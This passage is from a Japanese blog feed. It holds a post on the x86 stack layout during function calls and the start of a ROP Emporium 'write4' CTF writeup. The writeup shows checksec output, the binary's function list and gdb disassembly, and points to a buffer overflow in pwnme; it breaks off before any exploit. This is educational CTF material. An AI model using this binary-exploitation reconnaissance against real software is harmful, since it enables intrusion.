&lt;p&gt;以下のプログラムで&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/x86&quot;&gt;x86&lt;/a&gt;における関数呼び出し時のスタックの使い方&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;start&lt;/span&gt;:
&lt;span class=&quot;synComment&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;func&lt;/span&gt;  &lt;span class=&quot;synComment&quot;&gt;// func(1,2,3)&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;, &lt;span class=&quot;synConstant&quot;&gt;12&lt;/span&gt;
&lt;span class=&quot;synComment&quot;&gt;// ...&lt;/span&gt;

&lt;span class=&quot;synIdentifier&quot;&gt;func&lt;/span&gt;:
&lt;span class=&quot;synIdentifier&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;
&lt;span class=&quot;synComment&quot;&gt;// -- 関数の処理 --&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt; &lt;span class=&quot;synComment&quot;&gt;//espの復元&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt; &lt;span class=&quot;synComment&quot;&gt;// ebpの復元&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;ret&lt;/span&gt;
&lt;/pre&gt;


&lt;h2&gt;1.スタックに積まれる順番&lt;/h2&gt;

&lt;p&gt;1.引数&lt;br /&gt;
2.リターンアドレス&lt;br /&gt;
3.退避された&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;退避された&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;の次(スタックの先頭方向)にはローカル変数が格納される。&lt;/p&gt;

&lt;h2&gt;2.引数について&lt;/h2&gt;

&lt;h4&gt;pushされる順番&lt;/h4&gt;

&lt;p&gt;arg3,arg2,arg1の順でpushされる。&lt;/p&gt;

&lt;h4&gt;関数内での引数へのアクセス&lt;/h4&gt;

&lt;p&gt;[&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;+8] : 第一引数&lt;br /&gt;
[&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;+12] : 第二引数&lt;br /&gt;
[&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;+16] : 第三引数&lt;br /&gt;
(以下省略)&lt;/p&gt;

&lt;h2&gt;3.ローカル変数について&lt;/h2&gt;

&lt;h4&gt;ローカル変数の確保&lt;/h4&gt;

&lt;p&gt;関数内で以下の命令が実行される。&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;, &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt; * (確保するローカル変数の個数)
&lt;/pre&gt;


&lt;h4&gt;ローカル変数の破棄&lt;/h4&gt;

&lt;p&gt;ret命令直後、つまりcall命令の次のデータ列で以下の命令が実行される。&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;, &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt; * (確保するローカル変数の個数)
&lt;/pre&gt;


&lt;h4&gt;関数内でのローカル変数へのアクセス&lt;/h4&gt;

&lt;p&gt;[&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;-4],[&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;-8],[&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;-12]など&lt;/p&gt;

&lt;h2&gt;4.その他&lt;/h2&gt;

&lt;p&gt;leave命令は以下と等価&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;,&lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;enter命令は以下と等価&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ebp&lt;/span&gt;,&lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;,&lt;span class=&quot;synIdentifier&quot;&gt;N&lt;/span&gt;
&lt;/pre&gt;

</description>          <pubDate>Thu, 02 Apr 2020 00:38:05 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/26006613543576731</guid>
          
            <category>CTF pwn</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/26006613543576731/1638952784" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>ROP Emporium (3)Write4 [writeup]</title>
          <link>https://tamaron.hatenablog.com/entry/2020/03/30/151037</link>          <description>&lt;p&gt;・問題リンク
&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fropemporium.com%2Fchallenge%2Fwrite4.html&quot; title=&quot;write4 challenge&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://ropemporium.com/challenge/write4.html&quot;&gt;ropemporium.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;まず&lt;code&gt;strings&lt;/code&gt;コマンドで静的解析をする&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;$ strings write432
...
/bin/&lt;span class=&quot;synStatement&quot;&gt;ls&lt;/span&gt;
...
&lt;/pre&gt;


&lt;p&gt;プログラム内部でsystem()を呼び出していそうなことがわかる&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;$ gdb write432
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  &lt;span class=&quot;synStatement&quot;&gt;printf&lt;/span&gt;@plt
0x08048410  fgets@plt
0x08048420  puts@plt
**0x08048430  system@plt**
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048470  __gmon_start__@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x0804864c  usefulFunction
0x08048670  usefulGadgets
0x08048680  __libc_csu_init
0x080486e0  __libc_csu_fini
0x080486e4  _fini
gdb-peda$ 
&lt;/pre&gt;


&lt;p&gt;partial RERLOなのでGOT Overwriteが可能であり、NX bitがonなのでshellcodeによるexploitはできない。
((0)~(2)と同様&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/BoF&quot;&gt;BoF&lt;/a&gt;によってEIPが奪えるなのでGot Overwriteの必要はないが...)&lt;br&gt;
またpwnme、usefulFunction、usefulGadgetsをそれぞれディス&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EB&quot;&gt;アセンブル&lt;/a&gt;してみる。&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;gdb-peda$ pdisas main
Dump of assembler code &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; function main:
   0x0804857b &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     lea    ecx,&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;esp+0x4&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;
   0x0804857f &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     and    esp,0xfffffff0
   0x08048582 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     push   DWORD PTR &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;ecx-0x4&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;
   0x08048585 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   ebp
   0x08048586 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    mov    ebp,esp
   0x08048588 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   ecx
   0x08048589 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    sub    esp,0x4
   0x0804858c &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    mov    eax,ds:0x804a064
   0x08048591 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x0
   0x08048593 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x2
   0x08048595 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x0
   0x08048597 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   eax
   0x08048598 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048450 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;setvbuf@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x0804859d &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x080485a0 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    mov    eax,ds:0x804a040
   0x080485a5 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x0
   0x080485a7 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x2
   0x080485a9 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x0
   0x080485ab &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   eax
   0x080485ac &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048450 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;setvbuf@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x080485b1 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x080485b4 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    sub    esp,0xc
   0x080485b7 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x8048700
   0x080485bc &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048420 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;puts@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x080485c1 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x080485c4 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    sub    esp,0xc
   0x080485c7 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x8048717
   0x080485cc &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048420 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;puts@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x080485d1 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x080485d4 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x80485f6 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;pwnme&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x080485d9 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    sub    esp,0xc
   0x080485dc &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x804871f
   0x080485e1 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:   call   0x8048420 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;puts@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x080485e6 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:   add    esp,0x10
   0x080485e9 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:   mov    eax,0x0
   0x080485ee &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:   mov    ecx,DWORD PTR &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;ebp-0x4&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;
   0x080485f1 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;118&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:   leave  
   0x080485f2 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:   lea    esp,&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;ecx-0x4&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;
   0x080485f5 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:   ret    
End of assembler dump.
gdb-peda$ pdisas pwnme
Dump of assembler code &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; function pwnme:
   0x080485f6 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     push   ebp
   0x080485f7 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     mov    ebp,esp
   0x080485f9 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     sub    esp,0x28
   0x080485fc &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     sub    esp,0x4
   0x080485ff &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     push   0x20
   0x08048601 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x0
   0x08048603 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    lea    eax,&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;ebp-0x28&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;
   0x08048606 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   eax
   0x08048607 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048460 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;memset@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x0804860c &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x0804860f &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    sub    esp,0xc
   0x08048612 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x8048728
   0x08048617 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048420 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;puts@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x0804861c &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x0804861f &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    sub    esp,0xc
   0x08048622 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x8048751
   0x08048627 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048400 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;printf&lt;/span&gt;@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x0804862c &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x0804862f &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    mov    eax,ds:0x804a060
   0x08048634 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    sub    esp,0x4
   0x08048637 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   eax
   0x08048638 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   0x200
   0x0804863d &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    lea    eax,&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;ebp-0x28&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;
   0x08048640 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    push   eax
